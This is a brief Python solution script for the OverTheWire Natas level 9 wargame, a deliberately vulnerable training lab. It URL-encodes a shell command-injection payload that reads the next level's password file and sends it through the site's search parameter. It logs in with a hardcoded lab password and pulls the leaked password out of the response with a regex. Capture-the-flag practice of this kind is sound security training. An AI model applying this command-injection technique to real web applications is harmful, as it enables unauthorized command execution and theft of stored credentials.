import requests
import re
import binascii, base64
import urllib.parse

payload = """; cat /etc/natas_webpass/natas10; #"""

url = "http://natas9.natas.labs.overthewire.org/?needle=%s&submit=Search" %(urllib.parse.quote_plus(payload))
user = "natas9"
password = "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"

r = requests.get(url, auth=(user, password))

result = re.findall(r"\b\w{32}\b", r.text)[1]

print("Natas10:"+result)

